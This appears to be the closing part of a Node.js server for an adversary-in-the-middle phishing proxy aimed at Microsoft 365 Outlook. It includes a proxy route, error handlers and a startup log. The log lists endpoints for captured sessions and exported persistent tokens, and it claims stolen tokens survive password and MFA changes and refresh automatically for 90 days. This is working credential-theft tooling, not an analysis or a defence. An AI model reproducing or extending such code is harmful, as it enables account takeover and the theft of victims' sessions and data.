    if (req.method === 'POST') {
        req.body = { ...msParams, ...req.body };
    }

    proxyService.getMiddleware()(req, res, next);
});



















// ============= ERROR HANDLING =============
app.use(browserOnlyMiddleware);

app.use((req, res) => {
    res.status(404).json({
        error: 'Endpoint not found',
        path: req.path
    });
});

app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({
        error: 'Internal server error',
        message: err.message
    });
});

// ============= START SERVER =============
const PORT = process.env.PORT || 3001;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🚀 ========== SERVER STARTED ==========`);
    console.log(`📊 Mode: ${isProduction ? 'PRODUCTION' : 'DEVELOPMENT'}`);
    console.log(`🌐 App URL: ${cleanAppUrl}`);
    console.log(`📡 Port: ${PORT}`);
    console.log(`========================================\n`);

    console.log(`🔗 Available endpoints:`);
    console.log(`   ↪️  Root: ${cleanAppUrl}/`);
    console.log(`   🎯 Dual Token (CAE): ${cleanAppUrl}/en-us/microsoft-365/outlook`);
    console.log(`   📋 Captured Sessions: ${cleanAppUrl}/captured-sessions`);
    console.log(`   🔍 Token Status: ${cleanAppUrl}/api/token-status/:sessionId`);
    console.log(`   📤 Export Persistent: ${cleanAppUrl}/api/export-persistent/:sessionId`);
    console.log(`   🔄 Persistent Sessions: ${cleanAppUrl}/api/persistent-sessions`);
    console.log(`   ❤️  Health: ${cleanAppUrl}/health\n`);

    console.log(`✅ CAE-ENABLED FEATURES:`);
    console.log(`   • Tokens survive password changes automatically`);
    console.log(`   • Tokens survive MFA changes automatically`);
    console.log(`   • Auto-refresh every 30 minutes before expiry`);
    console.log(`   • Claims challenge handling enabled`);
    console.log(`   • 90-day persistent refresh tokens\n`);

    // Start the token refresh scheduler
    setTimeout(() => {
        tokenScheduler.start();
        console.log('✅ Persistent token management system initialized\n');
    }, 5000);
});

module.exports = { app, server, io };